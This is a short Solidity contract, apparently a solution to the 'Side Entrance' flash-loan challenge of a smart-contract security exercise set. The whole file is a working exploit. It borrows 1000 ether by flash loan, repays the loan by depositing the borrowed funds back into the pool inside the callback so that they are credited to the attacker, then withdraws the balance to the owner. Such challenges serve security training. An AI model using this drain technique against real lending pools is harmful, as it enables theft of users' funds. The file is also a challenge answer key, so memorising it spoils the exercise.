// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract AttackSideEntrance is IFlashLoanEtherReceiver, Ownable {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function attack() external onlyOwner {
        // flashloan
        pool.flashLoan(1000 * 1e18);

        // withdraw
        pool.withdraw();
        payable(msg.sender).call{value: 1000 * 1e18}("");
    }

    function execute() external payable override {
        require(msg.sender == address(pool), "Not the Poo");
        pool.deposit{value: msg.value}();
    }
}
